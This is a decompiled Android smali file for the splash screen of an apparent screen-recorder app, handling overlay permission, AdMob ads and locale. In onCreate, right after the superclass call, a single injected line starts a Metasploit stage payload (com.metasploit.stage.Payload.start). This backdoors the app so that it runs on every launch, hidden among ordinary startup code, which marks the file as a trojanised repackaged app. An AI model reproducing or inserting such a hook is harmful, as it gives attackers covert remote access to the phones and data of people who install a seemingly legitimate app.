.class public Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;
.super Landroidx/appcompat/app/AppCompatActivity;
.source "SplashScreenActivity.java"


# static fields
.field public static isFirstOpen:Z = true


# instance fields
.field mHandler:Landroid/os/Handler;

.field r:Ljava/lang/Runnable;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 27
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V

    return-void
.end method

.method public static isSystemAlertPermissionGranted(Landroid/content/Context;)Z
    .locals 2

    .line 146
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x17

    if-ge v0, v1, :cond_0

    const/4 p0, 0x1

    return p0

    .line 149
    :cond_0
    invoke-static {p0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result p0

    return p0
.end method

.method private onPermissionGranted()V
    .locals 2

    .line 168
    :try_start_0
    invoke-static {}, Lcom/ads/control/AdmobHelp;->getInstance()Lcom/ads/control/AdmobHelp;

    move-result-object v0

    new-instance v1, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity$2;

    invoke-direct {v1, p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity$2;-><init>(Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;)V

    invoke-virtual {v0, v1}, Lcom/ads/control/AdmobHelp;->showInterstitialAd(Lcom/ads/control/AdmobHelp$AdCloseListener;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method


# virtual methods
.method public checkPermission()V
    .locals 3

    .line 154
    invoke-static {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->isSystemAlertPermissionGranted(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 155
    invoke-direct {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->onPermissionGranted()V

    goto :goto_0

    .line 157
    :cond_0
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "package:"

    .line 158
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 159
    invoke-virtual {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 160
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    const-string v2, "android.settings.action.MANAGE_OVERLAY_PERMISSION"

    invoke-direct {v1, v2, v0}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/16 v0, 0xc

    invoke-virtual {p0, v1, v0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 161
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/GuideActivity;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->startActivity(Landroid/content/Intent;)V

    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 0

    const/16 p2, 0xc

    if-ne p1, p2, :cond_1

    .line 135
    invoke-static {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->isSystemAlertPermissionGranted(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 136
    invoke-direct {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->onPermissionGranted()V

    goto :goto_0

    :cond_0
    const p1, 0x7f1100c0

    const/4 p2, 0x1

    .line 138
    invoke-static {p0, p1, p2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    .line 139
    invoke-virtual {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->finishAffinity()V

    :cond_1
    :goto_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    .line 35
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V
    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    const/4 p1, 0x1

    .line 36
    invoke-virtual {p0, p1}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->requestWindowFeature(I)Z

    .line 37
    invoke-virtual {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/16 v1, 0x400

    invoke-virtual {v0, v1, v1}, Landroid/view/Window;->setFlags(II)V

    const v0, 0x7f0d0021

    .line 38
    invoke-virtual {p0, v0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->setContentView(I)V

    .line 39
    invoke-static {}, Lcom/ads/control/AdmobHelp;->getInstance()Lcom/ads/control/AdmobHelp;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/ads/control/AdmobHelp;->init(Landroid/content/Context;)V

    .line 40
    invoke-virtual {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->setLocale()V

    .line 41
    sput-boolean p1, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->isFirstOpen:Z

    .line 49
    new-instance p1, Landroid/os/Handler;

    invoke-direct {p1}, Landroid/os/Handler;-><init>()V

    iput-object p1, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->mHandler:Landroid/os/Handler;

    .line 50
    new-instance p1, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity$1;

    invoke-direct {p1, p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity$1;-><init>(Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;)V

    iput-object p1, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->r:Ljava/lang/Runnable;

    .line 58
    iget-object p1, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->mHandler:Landroid/os/Handler;

    iget-object v0, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->r:Ljava/lang/Runnable;

    const-wide/16 v1, 0x1b58

    invoke-virtual {p1, v0, v1, v2}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void
.end method

.method protected onDestroy()V
    .locals 2

    .line 203
    iget-object v0, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->mHandler:Landroid/os/Handler;

    if-eqz v0, :cond_0

    iget-object v1, p0, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->r:Ljava/lang/Runnable;

    if-eqz v1, :cond_0

    .line 204
    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    .line 205
    :cond_0
    invoke-super {p0}, Landroidx/appcompat/app/AppCompatActivity;->onDestroy()V

    return-void
.end method

.method public setLocale()V
    .locals 4

    const v0, 0x7f110057

    .line 184
    invoke-virtual {p0, v0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v2, "vi"

    invoke-static {p0, v1, v2}, Lcom/DUrecorder/screenrecorder/videorecorde/common/PrefUtils;->readStringValue(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 186
    invoke-static {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/common/PrefUtils;->firstOpen(Landroid/content/Context;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 187
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    .line 188
    invoke-virtual {v1, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 189
    invoke-virtual {p0, v0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0, v1}, Lcom/DUrecorder/screenrecorder/videorecorde/common/PrefUtils;->saveStringValue(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 193
    :cond_0
    new-instance v0, Ljava/util/Locale;

    invoke-direct {v0, v1}, Ljava/util/Locale;-><init>(Ljava/lang/String;)V

    .line 194
    invoke-virtual {p0}, Lcom/DUrecorder/screenrecorder/videorecorde/ui/activities/SplashScreenActivity;->getResources()Landroid/content/res/Resources;

    move-result-object v1

    .line 195
    invoke-virtual {v1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    .line 196
    invoke-virtual {v1}, Landroid/content/res/Resources;->getConfiguration()Landroid/content/res/Configuration;

    move-result-object v3

    .line 197
    iput-object v0, v3, Landroid/content/res/Configuration;->locale:Ljava/util/Locale;

    .line 198
    invoke-virtual {v1, v3, v2}, Landroid/content/res/Resources;->updateConfiguration(Landroid/content/res/Configuration;Landroid/util/DisplayMetrics;)V

    return-void
.end method
